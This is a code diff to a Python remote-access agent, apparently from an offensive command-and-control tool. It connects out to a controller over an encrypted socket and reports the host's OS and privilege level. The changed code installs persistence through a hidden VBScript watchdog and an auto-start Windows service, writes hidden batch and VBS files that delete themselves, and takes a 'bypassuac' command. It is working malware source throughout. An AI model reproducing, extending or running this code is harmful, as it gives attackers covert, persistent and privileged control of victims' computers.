@@ -135,6 +135,9 @@ cipher = AES.new(secret,AES.MODE_CFB, iv)
 MeterBin, DropSock, is64 = None, None, False
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 isAdmin, isSystem, is64 = False, False, False
+opsys = platform.uname()[0] + ' ' + platform.uname()[2]
+paddedopsys = opsys + '*' * (64 - len(opsys))
+starpadding = '*' * 16
 
 if platform.machine()[-2:] == '64':
 	is64 = True
@@ -172,17 +175,7 @@ if os.name == 'nt':
 			win32api.SetFileAttributes(agent,win32con.FILE_ATTRIBUTE_HIDDEN)
 		except:
 			pass
-else:
-	if os.getuid() == 0:
-		isSystem = True
-	pwdvar = 'pwd'
-
-s.connect((host, port))
-opsys = platform.uname()[0] + ' ' + platform.uname()[2]
-paddedopsys = opsys + '*' * (64 - len(opsys))
-starpadding = '*' * 16
-
-if os.name == 'nt':
+	
 	if is64:
 		if isSystem:
 			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOSY%s' % (paddedopsys, starpadding))
@@ -199,7 +192,11 @@ if os.name == 'nt':
 				success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOAH%s' % (paddedopsys, starpadding))
 			else:
 				success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOFH%s' % (paddedopsys, starpadding))
+
 elif os.name == 'posix':
+	if os.getuid() == 0:
+		isSystem = True
+	pwdvar = 'pwd'
 	if isSystem:
 		if is64:
 			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFESLY%s' % (paddedopsys, starpadding))
@@ -210,9 +207,12 @@ elif os.name == 'posix':
 			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOLY%s' % (paddedopsys, starpadding))
 		else:
 			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOLH%s' % (paddedopsys, starpadding))
+
 else:
+	pwdvar = 'pwd'
 	success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOUH%s' % (paddedopsys, starpadding))
 
+s.connect((host, port))
 s.send(success)
 pwd = fsubprocess(pwdvar).strip('**n').strip('**r')
 
@@ -287,20 +287,26 @@ while 1:
 			s.send(encrypted)
 
 	elif decrypted.startswith("persistence"):
-		vbscript = 'state = 1**nhidden = 0**nwshname = "' + agent + '"**nvbsname = "' + vbsdst + '"**nWhile state = 1**nexist = ReportFileStatus(wshname)**nIf exist = True then**nset objFSO = CreateObject("Scripting.FileSystemObject")**nset objFile = objFSO.GetFile(wshname)**nset objFSO = CreateObject("Scripting.FileSystemObject")**nset objFile = objFSO.GetFile(vbsname)**nSet WshShell = WScript.CreateObject ("WScript.Shell")**nSet colProcessList = GetObject("Winmgmts:").ExecQuery ("Select * from Win32_Process")**nFor Each objProcess in colProcessList**nif objProcess.name = "' + agentname + '" then**nvFound = True**nEnd if**nNext**nIf vFound = True then**nwscript.sleep 7000**nElse**nWshShell.Run """' + agent + '""",hidden**nwscript.sleep 7000**nEnd If**nvFound = False**nElse**nwscript.sleep 7000**nEnd If**nWend**nFunction ReportFileStatus(filespec)**nDim fso, msg**nSet fso = CreateObject("Scripting.FileSystemObject")**nIf (fso.FileExists(filespec)) Then**nmsg = True**nElse**nmsg = False**nEnd If**nReportFileStatus = msg**nEnd Function**n'
-		with open(vbsdst, 'w') as pv:
-			pv.write(vbscript)
-		win32api.SetFileAttributes(vbsdst,win32con.FILE_ATTRIBUTE_HIDDEN)
-		cmd = "copy " + sys.argv[0] + ' ' + agent + ' & sc create win32svc binPath= "cmd.exe /c wscript.exe ' + vbsdst + '" type= own start= auto & sc start win32svc'
-		#hb = 'CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False**n'
-		#with open(tempvbs, 'w') as hid:
-		#	hid.write(hb)
-		#with open(tempbat, 'w') as cbat:
-		#	cbat.write(cmds)
-		#win32api.SetFileAttributes(tempbat,win32con.FILE_ATTRIBUTE_HIDDEN)
-		#win32api.SetFileAttributes(tempvbs,win32con.FILE_ATTRIBUTE_HIDDEN)
-		#rcmd = tempvbs + ' ' + tempbat
-		fbypass(cmd)
+		if not os.path.isfile(vbsdst):
+			vbscript = 'state = 1**nhidden = 0**nwshname = "' + agent + '"**nvbsname = "' + vbsdst + '"**nWhile state = 1**nexist = ReportFileStatus(wshname)**nIf exist = True then**nset objFSO = CreateObject("Scripting.FileSystemObject")**nset objFile = objFSO.GetFile(wshname)**nset objFSO = CreateObject("Scripting.FileSystemObject")**nset objFile = objFSO.GetFile(vbsname)**nSet WshShell = WScript.CreateObject ("WScript.Shell")**nSet colProcessList = GetObject("Winmgmts:").ExecQuery ("Select * from Win32_Process")**nFor Each objProcess in colProcessList**nif objProcess.name = "' + agentname + '" then**nvFound = True**nEnd if**nNext**nIf vFound = True then**nwscript.sleep 7000**nElse**nWshShell.Run """' + agent + '""",hidden**nwscript.sleep 7000**nEnd If**nvFound = False**nElse**nwscript.sleep 7000**nEnd If**nWend**nFunction ReportFileStatus(filespec)**nDim fso, msg**nSet fso = CreateObject("Scripting.FileSystemObject")**nIf (fso.FileExists(filespec)) Then**nmsg = True**nElse**nmsg = False**nEnd If**nReportFileStatus = msg**nEnd Function**n'
+			with open(vbsdst, 'w') as pv:
+				pv.write(vbscript)
+			win32api.SetFileAttributes(vbsdst,win32con.FILE_ATTRIBUTE_HIDDEN)
+			cmds = "copy " + sys.argv[0] + ' ' + agent + '**n'
+			cmds += 'sc create win32svc binPath= "cmd.exe /c wscript.exe ' + vbsdst + '" type= own start= auto**n'
+			cmds += 'del ' + tempvbs + '**n'
+			cmds += 'del /AH "%~f0" & sc start win32svc**n'
+			hb = 'CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False**n'
+			with open(tempvbs, 'w') as hid:
+				hid.write(hb)
+			with open(tempbat, 'w') as cbat:
+				cbat.write(cmds)
+			win32api.SetFileAttributes(tempvbs,win32con.FILE_ATTRIBUTE_HIDDEN)
+			win32api.SetFileAttributes(tempbat,win32con.FILE_ATTRIBUTE_HIDDEN)
+			rcmd = tempvbs + ' ' + tempbat
+			fbypass(rcmd)
+		else:
+			fbypass('sc start win32svc')
 
 	elif decrypted.startswith("bypassuac "):
 		cmds = ' '.join(decrypted.split(' ')[1:])
